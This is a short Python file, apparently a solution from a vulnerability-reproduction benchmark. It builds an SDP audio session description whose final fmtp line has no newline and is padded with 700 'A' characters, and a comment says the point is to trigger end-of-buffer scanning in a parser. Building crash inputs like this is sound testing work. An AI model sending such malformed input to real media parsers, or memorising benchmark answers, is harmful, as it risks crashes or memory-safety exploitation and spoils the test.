import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        sdp_lines = [
            "v=0\r\n",
            "o=- 0 0 IN IP4 127.0.0.1\r\n",
            "s=-\r\n",
            "t=0 0\r\n",
            "c=IN IP4 127.0.0.1\r\n",
            "m=audio 9 RTP/AVP 0 96\r\n",
            "a=rtpmap:0 PCMU/8000\r\n",
            "a=rtpmap:96 opus/48000/2\r\n",
            "a=fmtp:96 maxplaybackrate=48000;stereo=1;useinbandfec=1\r\n",
        ]
        # Final line intentionally lacks trailing newline to trigger end-of-buffer scanning
        last = "a=fmtp:96 profile-level-id=" + ("A" * 700)
        sdp = "".join(sdp_lines) + last
        return sdp.encode("ascii")
